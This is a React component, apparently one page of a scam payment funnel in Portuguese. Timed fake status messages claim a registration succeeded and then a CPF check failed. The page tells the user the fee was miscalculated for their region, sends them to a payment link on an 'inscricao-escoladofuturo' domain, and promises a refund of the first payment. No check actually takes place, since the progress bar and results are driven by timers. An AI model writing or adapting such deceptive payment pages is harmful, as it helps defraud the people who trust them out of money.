import React, { useState, useEffect } from 'react';
import useUtmNavigator from '../hooks/useUtmNavigator';

const Upsell4: React.FC = () => {
  const navigate = useUtmNavigator();
  const [step, setStep] = useState(1);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const timer1 = setTimeout(() => setStep(2), 3000);
    const timer2 = setTimeout(() => setStep(3), 6000);
    const timer3 = setTimeout(() => setStep(4), 9000);

    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev < 100) {
          return prev + 1;
        }
        clearInterval(progressInterval);
        return 100;
      });
    }, 30);

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearInterval(progressInterval);
    };
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="max-w-md w-full space-y-4">
        {/* First Message */}
        <div className="bg-white rounded-lg shadow-lg p-6 text-center">
          <h2 className="text-2xl font-bold mb-4">
            Sua inscrição foi concluído!
          </h2>
          <p className="text-gray-600 mb-4">
            Aguarde enquanto inseriamos seus dados no formulario...
          </p>
          <div className="h-2 bg-gray-200 rounded-full">
            <div 
              className="h-2 bg-green-500 rounded-full transition-all duration-300"
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>

        {/* Second Message */}
        {step >= 2 && (
          <div className="bg-white rounded-lg shadow-lg p-6 text-center">
            <h2 className="text-2xl font-bold mb-2">
              Incrição Concluído com Sucesso
            </h2>
            <div className="text-green-500 text-4xl mb-2">✓</div>
            <p className="text-gray-600">Aguarde um momento...</p>
          </div>
        )}

        {/* Third Message */}
        {step >= 3 && (
          <div className="bg-white rounded-lg shadow-lg p-6 text-center">
            <h2 className="text-2xl font-bold mb-2">
              Validação do CPF para Aprovação
            </h2>
            <div className="text-red-500 text-4xl mb-2">✕</div>
            <p className="text-gray-600">
              Estamos verificando as informações...
            </p>
          </div>
        )}

        {/* Final Message with CTA */}
        {step >= 4 && (
          <div className="bg-white rounded-lg shadow-lg p-6 text-center">
            <h2 className="text-2xl font-bold mb-4">
              O valor da inscrição foi calculado errado para sua região.
            </h2>
            <p className="text-gray-600 mb-6">
              Pague o valor correto da inscrição para ser efetivada.
            </p>
            <button
              onClick={() => window.location.href = 'https://pay.inscricao-escoladofuturo.online/YL9jZDWw0J63p4q?utm_source=utm_source&utm_campaign=utm_campaign&utm_medium=utm_medium&utm_content=utm_content'}
              className="w-full bg-green-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-green-600 transition-colors animate-pulse"
            >
              PAGAR INSCRIÇÃO
            </button>
            <p className="text-gray-500 text-sm mt-4">
              (O Valor pago da inscrição anterior será reembolsado)
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default Upsell4;